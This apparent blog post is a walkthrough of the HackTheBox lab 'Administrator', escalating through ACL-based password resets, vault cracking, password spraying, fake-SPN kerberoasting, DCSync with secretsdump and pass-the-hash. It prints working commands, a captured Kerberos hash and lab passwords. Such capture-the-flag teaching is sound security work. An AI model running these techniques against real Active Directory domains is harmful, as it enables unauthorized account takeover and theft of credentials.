---
categories:
- CTF
layout: post
image:
  path: preview.png
media_subpath: /assets/posts/2025-07-01-administrator-hackthebox
tags:
- hackthebox
- windows
- active directory
- acl
title: Administrator @ HackTheBox
---
Administrator is an medium-difficulty machine on [hackthebox.eu](https://www.hackthebox.eu). Initial access is gained through provided credentials. This box contains mulitple user accounts to compromise through exploiting ACL's, FTP and bloodhound. Michael's password can be reset through 'GenericAll'. Using michaels account, we can ForceChangePassword benjamin's password which allows us to reset his password. Benjamin has access to FTP which reveals a Backup.psafe3, cracking this with hashcat gives several usernames and passwords. Spraying these passwords across the network gains access to emily's account. Using bloodhound, Emily has GenericWrite over "Ethan's" account. Creating a fake SPN for Ethan allows us to kerberoast the user account, gaining a hash which we can crack to gain control over his account. Root access is gained through Ethan's account where a desync attack is possible, obtaining the administrator hash, a pass-the-hash attack is possible where we gain full control over the domain controller.


## User & Root Flag
This post is a walkthrough for Administrator, an medium machine on [hackthebox.eu](https://www.hackthebox.eu). 

The initial scan (`nmap -Pn -n -sC -sV -p- 10.129.93.47`) shows the following results:

```
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-01 07:04:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
54613/tcp open  msrpc         Microsoft Windows RPC
56188/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
56193/tcp open  msrpc         Microsoft Windows RPC
56212/tcp open  msrpc         Microsoft Windows RPC
56215/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s
| smb2-time: 
|   date: 2025-07-01T07:05:23
|_  start_date: N/A
```

## Starting Creds
Running bloodhound, Olivia has `GenericWrite` over `Michaels` account, allowing us to reset his password.
![capture-1](capture-1.png)
```
Set-ADAccountPassword -Identity "michael" -NewPassword (ConvertTo-SecureString "N3wP@ssw0rd!!" -AsPlainText -Force) -Reset
```
![capture-2](capture-2.png)
## Michael
Using evil-wirrm, we can log in as Michael.
Looking through bloodhound again shows that we have `ForceChangePassword` over Benjamin's account.
![capture-3](capture-3.png)
```
Set-ADAccountPassword -Identity benjamin -Reset -NewPassword (ConvertTo-SecureString "P@ssw0rd!!" -AsPlainText -Force)
```
![capture-4](capture-4.png)

## Benjamin
Because Benjamin does not have access to RDP, the only way to check to see if his password was reset is by using smbmap.
![capture-5](capture-5.png)
Bloodhound does not reveal anything, but checking FTP, we find a 'Backup.psafe3'. 
![capture-6](capture-6.png)
Downloading this, we can crack the master password with hashcat.
```
hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
```
![capture-7](capture-7.png)
in order to open this file, use a Windows machine & download the following program: [pwsafe.org](https://pwsafe.org).
Once opened, enter the cracked masterpassword to gain access to the vault.
![capture-8](capture-8.png)
Copying the username and passwords to seperate files (usernames.txt, passwords.txt), we can spray these across the network using nxc.
```
nxc smb 10.129.93.47 -u usernames.txt -p passwords.txt -d administrator.htb
```
![capture-9](capture-9.png)

## Emily
Log in through win-rm to gain the userflag.
Looking through bloodhound, we have `GenericWrite` over "Ethan's" account.
![capture-10](capture-10.png)
We can create a fake SPN and make the account keberoastable to gain their hash.
```
Set-ADUser ethan -ServicePrincipalNames @{Add="fake/http/roastme"}
Set-ADUser ethan -Properties -ServicePrincipalName // check to see if it worked
```
![capture-11](capture-11.png)
Once the fake SPn has been added, run impackets GetUserSPNs.

```
┌──(tsunami㉿coffee)-[~/Documents/administratort]
└─$ sudo systemctl stop systemd-timesyncd // only do this if clock-skew is an issue!!
                                                                                      
┌──(tsunami㉿coffee)-[~/Documents/administratort]
└─$ sudo ntpdate 10.129.93. 47 // only do this if clock-skew is an issue!!                                                                               
2025-07-02 02:04:41.324680 (+0100) +25201.444049 +/- 0.009502 10.129.93.47 s1 no-leap
CLOCK: time stepped by 25201.444049
                                                                                              
┌──(tsunami㉿coffee)-[~/Documents/administratort]
└─$ impacket-GetUserSPNs administrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -dc-ip 10.129.93.47 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name   MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  -----  --------  --------------------------  ---------  ----------
fake/http/roastme     ethan            2024-10-12 21:52:14.117811  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$43d875759120fc9b383d5e18c0c3c62b$d3cd5f35a4e2631bedfff364824f91f84fa67c0a15161dc691ce5405484898e5dfc079ec7c0da9709fd311ee0510ac18e5a76cfff57cf4073d99ed74e9116d5df87a5251684092c9f3936c4ccf7be77567e2defdda64d1fae29e8fd90ea9035b59b2e88a0ddec7327e46084b469ff8e69ddcc0cd566713126649e5cd6e86f028b6e0da6bb1b9f16c24ba5312caa39fb6e0568f419c1405c1478d515788425e952ebb1b35c54175c1f309f8e2bc9f74ff99c774b0bde0688b895caa1e29de92b0e3b30c54f3096e02a2b7227b5c6019fba26d761d1119cab7aa11d8ad860096baea4d4f8bd065692e5472a1704df4fb8416a3ab5f9f89dffe871950c48d303ba0bd5e407fc2105b42a16cfc3f219134a370fca26009bfab1a1ad8526061ac6096899a527ccbdcb079bdeb01c171584065d735cf3594d263491ff2965fe58e02ae223f98c0ee1476fdf1b7c38a433367924ca715deda1305cd00864cdcdf9f7180ea01352d0c54c9bd05da2d66f70010b104977c28129a36d8b553677f077eab446ee32952bd8a6a4495a15945036f8321b57a1aa6b9c8d01e78b117fef88f32da5246c6a6f208d3b17c8fc4b586f331724440eed0f463e116204d485b503886badc6a07d51a76adce628858640ed8a85a60f8d99d64d21f392000e357f84eab5bcc917c6423a1ae1a86325500df70ce4a24050f64e82f1b2763347d1407dbd2b66d2027a75b16e288d625d23fa1dd1320b81ef563bcb667af4f21ab1b73fcc8141aaea57f6160a5f7b8b7e548db1e04dccf3a8818171a6832e34a59da7d5a8e43fe10ebfcf38f1018d952662dbd9f883cd9007c7efc26079586c05d103df1c6b4a09efbf96dae4726e5c61fe1d2e645948620e688c5eca9d4d13b4dd2392013bc2d963e8a707803ddf9b1bf61a2ba95914f7dc2c2ecefff9cb3fe49f438e9f1eb3e7c28992782a571fbd0e4b5b0b6e5501635334eb97dbe99226eec6cfbdd580d3a54d46594d0eee5dcdfc2c40566511db288c003926a9d8b3f42a1279de34536eea2dc1e957904f8dd8a70e80ba3c465fab7d85d14a9bf8e160919a9c6041bc28540701a833e5b131420f9ffc9041bd7a71a1fff4cb687dc928aaa510a0795385f490cd12e82092ba940a96e959102f31868ac3921d36472e57988f9b120ea0375fab39c53bca489f0f37258a81beed97d7cd7a37674889e3051b5a9228b61ebcd52c971ef35ff642ac079fb7661bcff55cbf0e1a2d125f3a2619547404afe9cb187009d89bd62bdd18090aa63c84688df3be81c4fc857a51c8aa085852ab545f9a90327f6d655f8ed6d6b2b19a9048eba093245391631c8fc7a6270c1e2f0c36e8c4a59c5bdcfffc33dc76c37f7e4812aa6a67a2df6006a2285e48e48a903a57227f2649e84261ab4e7a88b668d62794467d9718d68b37c8774c18ff2a7952e462272625f8c33d310ee3b921bcf74b961c9f688bc1f6ffdb5f9c0e55d0a9c730eae39d2e795a6a942326429dc0e8b0668863425352cdcf89b767513193dd6
```
With Ethan's hash, use hashcat to crack it.
```
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
![capture-13](capture-hash.png)

## Ethan
Using bloodhound again, we find that Ethan has `GetChangesAll, GetChanges` over the domain controller. This allows us to perform a desync attack, giving us access to user hashes.
![capture-13](capture-13.png)
Using impackets secretdump, we can dump the domain controllers hashes.
```
sudo impacket-secretsdump 'administrator.htb/ethan:limpbizkit@10.129.93.47'
```
![capture-14](capture-14.png)
With the administrator hash, we can perform a pass-the-hash attack to obtain the root flag.
![capture-15](capture-15.png)